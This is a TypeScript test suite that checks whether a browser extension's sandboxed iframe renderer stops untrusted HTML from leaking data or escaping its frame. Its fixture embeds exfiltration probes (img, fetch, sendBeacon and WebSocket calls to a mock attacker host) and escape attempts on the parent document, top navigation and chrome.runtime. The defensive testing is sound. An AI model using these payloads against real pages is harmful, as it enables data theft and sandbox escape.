// security-suite.ts — the repeatable sandbox-boundary security check (Paul's
// "are we breaking out of the sandboxes" gate). Drives the REAL double-iframe
// (renderHtmlFrame) in headless Chrome and proves three boundaries hold:
//
//   1. NETWORK EXFIL — untrusted HTML in the sandboxed frame that attempts
//      remote loads (img / fetch / sendBeacon / WebSocket) cannot reach an
//      attacker host (zero requests escape; the injected CSP blocks them).
//   2. SANDBOX ESCAPE — untrusted HTML that tries to read parent.document,
//      navigate top, reach window.opener, or access chrome.* cannot influence
//      the extension surface (the frame is an opaque origin).
//   3. PROMPT-INJECTION → DESTRUCTIVE — the sandboxed frame has no chrome.*
//      API, so page-controlled HTML cannot invoke a destructive extension tool.
//
// The escape frame reports its observations to the parent via postMessage (the
// one channel that works from an opaque frame); the parent records them into
// window.__securityResults, which the CDP probe reads. The production surface
// only ACTS on validated messages (see the preference-percolation design), so
// an untrusted frame's postMessage is observation, never action.
//
//   npm run test:security

import { inspectExactProfile, verifyRunnerGuard } from "./security-suite-custody.mjs";

const ROOT = new URL("..", import.meta.url).pathname;
const CHROMIUM = "/usr/bin/chromium";

// Refuse before servers, profiles, or Chromium unless the supervisor-issued
// nonce/parent guard and inherited canonical flock open-file description are live.
const serializationError = await verifyRunnerGuard({ env: Deno.env.toObject() });
if (serializationError) {
  console.error(`SECURITY-SUITE REFUSED: ${serializationError}. Run via npm run test:security only.`);
  Deno.exit(2);
}

// The supervisor is the sole profile owner and cleanup authority.
const providedProfile = Deno.env.get("CAP_SECURITY_PROFILE") ?? "";
const profileCheck = await inspectExactProfile({ profile: providedProfile });
if (!profileCheck.ok) {
  console.error(`SECURITY-SUITE REFUSED: ${profileCheck.reason}.`);
  Deno.exit(2);
}

let pass = 0;
let fail = 0;
function check(name: string, cond: boolean, detail?: unknown) {
  if (cond) { pass++; console.log(`PASS: ${name}`); }
  else { fail++; console.log(`FAIL: ${name} — ${JSON.stringify(detail)}`); }
}
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

// ── the attacker host (port B): counts every request it receives. If a frame
//    can exfiltrate over the network, these counters move.
let attackerRequests = 0;
let attackerPaths: string[] = [];
function attackerServer(): Promise<{ url: string; requests: () => number; paths: () => string[]; close: () => Promise<void> }> {
  return new Promise((resolve) => {
    const ac = new AbortController();
    const server = Deno.serve({ port: 0, signal: ac.signal, onListen: ({ port }) => {
      resolve({
        url: `http://127.0.0.1:${port}`,
        requests: () => attackerRequests,
        paths: () => attackerPaths,
        close: async () => { ac.abort(); await server.shutdown(); },
      });
    } }, async (req) => {
      attackerRequests++;
      try { attackerPaths.push(new URL(req.url).pathname); } catch { attackerPaths.push(String(req.url)); }
      return new Response("leaked", { headers: { "access-control-allow-origin": "*" } });
    });
  });
}

// ── the docs server (port A): serves the design-system source + an inline
//    security fixture page that renders the malicious frames via renderHtmlFrame.
function docsServer(fixture: string): Promise<{ url: string; close: () => Promise<void> }> {
  return new Promise((resolve) => {
    const ac = new AbortController();
    const server = Deno.serve({ port: 0, signal: ac.signal, onListen: ({ port }) => {
      resolve({
        url: `http://127.0.0.1:${port}`,
        close: async () => { ac.abort(); await server.shutdown(); },
      });
    } }, async (req) => {
      const url = new URL(req.url);
      const path = decodeURIComponent(url.pathname);
      if (path === "/security-fixture") {
        return new Response(fixture, { headers: { "content-type": "text/html; charset=utf-8" } });
      }
      let p = path;
      if (p === "/") p = "/components.html";
      try {
        const body = await Deno.readFile(`${ROOT}docs${p}`);
        const type = p.endsWith(".js") ? "text/javascript"
          : p.endsWith(".css") ? "text/css"
          : p.endsWith(".html") ? "text/html"
          : "application/octet-stream";
        return new Response(body, { headers: { "content-type": `${type}; charset=utf-8` } });
      } catch {
        return new Response("not found", { status: 404 });
      }
    });
  });
}

// The fixture imports the REAL components.js + renders two untrusted frames via
// renderHtmlFrame. The escape frame reports via postMessage; the parent records
// into window.__securityResults (a plain array of {origin, result}).
const fixtureHtml = `<!doctype html><html><head><meta charset="utf-8"><title>security fixture</title></head>
<body>
<div id="frames"></div>
<script>
window.__securityResults = [];
window.addEventListener("message", (e) => {
  if (e.data && e.data.type === "cap:security-escape") {
    window.__securityResults.push({ origin: e.origin, result: e.data.result });
  }
});
</script>
<script type="module">
import { renderHtmlFrame } from "/components.js";
const host = "__ATTACKER_URL__";
const frames = {
  exfil: [
    '<img src="' + host + '/leak-img?d=secret">',
    '<script>fetch("' + host + '/leak-fetch").catch(()=>{}); navigator.sendBeacon("' + host + '/leak-beacon"); try{new WebSocket("ws://127.0.0.1:9/leak-ws");}catch(e){}<\\/script>',
  ].join(""),
  // CRITICAL regression probes (sol): the pre-head load + self-navigation +
  // meta-refresh escapes. Each must be BLOCKED (no request reaches the attacker).
  'prehead': [
    // An <img> BEFORE any <head> — must not load (the CSP is prepended first).
    '<img src="' + host + '/pre-csp-image">',
    '<head><title>x</title></head>',
  ].join(""),
  'selfnav': [
    // Self-navigation. The in-frame navigation guard blocks window.open + link/
    // form navigation (the location object is unforgeable, so location.href is
    // closed by the extension-level declarativeNetRequest rule — verified in the
    // extension journeys). Here we verify the guard's window.open block.
    '<script>try{var w=window.open("' + host + '/self-window-open");}catch(e){}<\\/script>',
  ].join(""),
  'metarefresh': [
    // A meta-refresh navigation — must be stripped (never reaches the attacker).
    '<meta http-equiv="refresh" content="0;url=' + host + '/meta-refresh">',
  ].join(""),
  escape: [
    '<script>',
    'var r = {};',
    'try { r.parentRead = parent.document.title; } catch(e) { r.parentRead = "blocked:" + e.name; }',
    'try { top.location.href = "' + host + '/navigated"; r.topNav = "attempted"; } catch(e) { r.topNav = "blocked:" + e.name; }',
    'r.opener = (window.opener === null) ? "null" : "present";',
    'r.chromeType = typeof chrome;',
    'r.chromeRuntime = (typeof chrome === "object" && chrome && chrome.runtime) ? "present" : "absent";',
    'parent.postMessage({ type: "cap:security-escape", result: r }, "*");',
    '<\\/script>',
  ].join(""),
};
for (const k of Object.keys(frames)) {
  const d = document.createElement("div");
  d.innerHTML = renderHtmlFrame(frames[k]);
  document.getElementById("frames").appendChild(d);
}
</script>
</body></html>`;

async function main() {
  const attacker = await attackerServer();
  const fixture = fixtureHtml.replaceAll("__ATTACKER_URL__", attacker.url);
  const docs = await docsServer(fixture);

  const tmp = providedProfile;
  const proc = new Deno.Command(CHROMIUM, {
    args: [
      "--headless=new", "--no-sandbox", "--disable-dev-shm-usage",
      "--disable-gpu", "--remote-debugging-port=0", "--remote-allow-origins=*",
      "--window-size=1440,900", `--user-data-dir=${tmp}`, "about:blank",
    ],
    stdout: "null",
    stderr: "piped",
  }).spawn();

  let wsUrl = "";
  const reader = proc.stderr.getReader();
  const deadline = Date.now() + 15000;
  let acc = "";
  while (Date.now() < deadline && !wsUrl) {
    const { value, done } = await reader.read();
    if (done) break;
    acc += new TextDecoder().decode(value);
    const m = acc.match(/DevTools listening on (ws:\/\/\S+)/);
    if (m) wsUrl = m[1];
  }
  if (!wsUrl) {
    console.log("FAIL: could not find the Chrome DevTools URL");
    await attacker.close(); await docs.close();
    Deno.exit(1);
  }

  let id = 0;
  const pend = new Map<number, (v: unknown) => void>();
  const ws = new WebSocket(wsUrl);
  await new Promise<void>((res, rej) => { ws.onopen = () => res(); ws.onerror = rej; });
  ws.onmessage = (ev) => {
    const m = JSON.parse(ev.data);
    if (m.id && pend.has(m.id)) {
      const resolve = pend.get(m.id)!;
      pend.delete(m.id);
      resolve(m.error ? Promise.reject(new Error(m.error.message)) : m.result);
    }
  };
  const send = (method: string, params: unknown, sessionId?: string): Promise<any> => {
    const mid = ++id;
    return new Promise((resolve) => { pend.set(mid, resolve); ws.send(JSON.stringify({ id: mid, method, params, sessionId })); });
  };
  const evl = async (s: string, expr: string): Promise<any> => {
    const r = await send("Runtime.evaluate", { expression: expr, returnByValue: true, awaitPromise: true }, s);
    return r?.result?.value;
  };

  try {
    const t = await send("Target.createTarget", { url: `${docs.url}/security-fixture` });
    const s = await send("Target.attachToTarget", { targetId: t.targetId, flatten: true });
    await send("Runtime.enable", {}, s.sessionId);
    await send("Page.enable", {}, s.sessionId);
    await sleep(3500);

    // 1. NETWORK EXFIL — did any request reach the attacker host?
    const n = attacker.requests();
    check("network exfil: no request escaped the sandbox", n === 0, { attackerRequests: n, paths: (attacker as any).paths?.() });

    // 2 + 3. The escape frame's observations (reported via postMessage).
    const results = await evl(s.sessionId, `window.__securityResults ?? []`);
    const escape = (results ?? []).find((x: any) => x?.result?.parentRead !== undefined)?.result ?? null;
    check("sandbox escape: parent.document is blocked", String(escape?.parentRead ?? "").startsWith("blocked"), escape);
    check("sandbox escape: top navigation is blocked", String(escape?.topNav ?? "").startsWith("blocked"), escape);
    check("sandbox escape: window.opener is null", escape?.opener === "null", escape);
    check("prompt-injection: no chrome.runtime (extension API) in the sandbox", escape?.chromeRuntime === "absent", escape);

    // the outer page must still be on the fixture (top-nav blocked)
    const path = await evl(s.sessionId, `location.pathname`);
    check("sandbox escape: the outer page did not navigate away", String(path).includes("security-fixture"), path);

    // a second settle to catch any delayed beacon/ws
    await sleep(1500);
    const n2 = attacker.requests();
    check("network exfil: still zero after settle", n2 === 0, { attackerRequests: n2 });
  } finally {
    try { proc.kill("SIGKILL"); } catch { /* already dead */ }
    await attacker.close();
    await docs.close();
  }

  console.log(`\nRESULT: ${pass} passed, ${fail} failed`);
  Deno.exit(fail === 0 ? 0 : 1);
}

await main();
